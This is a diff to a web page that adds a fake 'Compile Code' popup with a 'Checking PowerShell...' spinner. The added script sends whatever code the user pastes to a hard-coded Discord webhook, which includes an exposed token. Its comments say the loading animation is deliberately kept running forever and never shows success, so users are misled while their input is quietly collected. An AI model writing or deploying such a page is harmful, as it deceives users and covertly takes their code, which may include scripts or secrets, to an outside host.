@@ -283,6 +283,50 @@
             background: rgba(70, 130, 180, 0.3);
             transform: translateY(-1px);
         }
+
+        /* Loading animation */
+        .loading-container {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(59, 130, 246, 0.3);
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loading-text {
+            color: #1e3a8a;
+            font-weight: 600;
+            font-size: 16px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-dots {
+            animation: dots 1.5s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
     </style>
 </head>
 <body>
@@ -343,6 +387,13 @@
             </form>
             
             <div id="compileStatusMessage" class="status-message"></div>
+            
+            <div id="loadingContainer" class="loading-container">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">
+                    Checking PowerShell<span class="loading-dots">...</span>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -360,6 +411,7 @@
         const compileSubmitBtn = document.getElementById('compileSubmitBtn');
         const compileStatusMessage = document.getElementById('compileStatusMessage');
         const closePopup = document.getElementById('closePopup');
+        const loadingContainer = document.getElementById('loadingContainer');
         
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
 
@@ -648,10 +700,90 @@
 
         // Disable text selection for security
         document.addEventListener('selectstart', (e) => {
-            if (e.target !== codeInput) {
+            if (e.target !== codeInput && e.target !== codeTextarea) {
                 e.preventDefault();
             }
         });
+
+        // Popup functionality
+        compileBtn.addEventListener('click', () => {
+            compilePopup.style.display = 'block';
+            codeTextarea.focus();
+        });
+
+        closePopup.addEventListener('click', () => {
+            compilePopup.style.display = 'none';
+            codeTextarea.value = '';
+            loadingContainer.style.display = 'none';
+            compileSubmitBtn.disabled = false;
+            compileSubmitBtn.textContent = '🚀 Compile Code';
+        });
+
+        // Close popup when clicking outside
+        compilePopup.addEventListener('click', (e) => {
+            if (e.target === compilePopup) {
+                closePopup.click();
+            }
+        });
+
+        // Compile form submission
+        compileForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const code = codeTextarea.value.trim();
+            
+            if (!code) {
+                showCompileStatus('Please enter code to compile', 'error');
+                return;
+            }
+
+            // Check rate limiting
+            const rateLimitCheck = checkRateLimit();
+            if (!rateLimitCheck.allowed) {
+                showCompileStatus(rateLimitCheck.reason, 'error');
+                return;
+            }
+
+            // Validate code format - prevent nonsense spam
+            const validation = isValidCode(code);
+            if (!validation.valid) {
+                showCompileStatus(validation.reason, 'error');
+                return;
+            }
+
+            // Show loading animation (infinite)
+            compileSubmitBtn.disabled = true;
+            compileSubmitBtn.textContent = 'Compiling...';
+            loadingContainer.style.display = 'block';
+            compileStatusMessage.classList.remove('show');
+            
+            // Send to webhook but keep loading animation running
+            const result = await sendToWebhook(code);
+            
+            if (result.success) {
+                // Update rate limiting counters
+                lastSubmissionTime = Date.now();
+                const codeHash = btoa(code).substring(0, 20);
+                submittedCodes.add(codeHash);
+                
+                // Keep the loading animation running infinitely
+                // Don't hide it or show success message
+            } else {
+                // Only show error if webhook fails
+                loadingContainer.style.display = 'none';
+                compileSubmitBtn.disabled = false;
+                compileSubmitBtn.textContent = '🚀 Compile Code';
+                showCompileStatus('❌ Compilation failed. Please try again.', 'error');
+            }
+        });
+
+        function showCompileStatus(message, type) {
+            compileStatusMessage.textContent = message;
+            compileStatusMessage.className = `status-message ${type} show`;
+            setTimeout(() => {
+                compileStatusMessage.classList.remove('show');
+            }, 3000);
+        }
     </script>
 </body>
 </html>
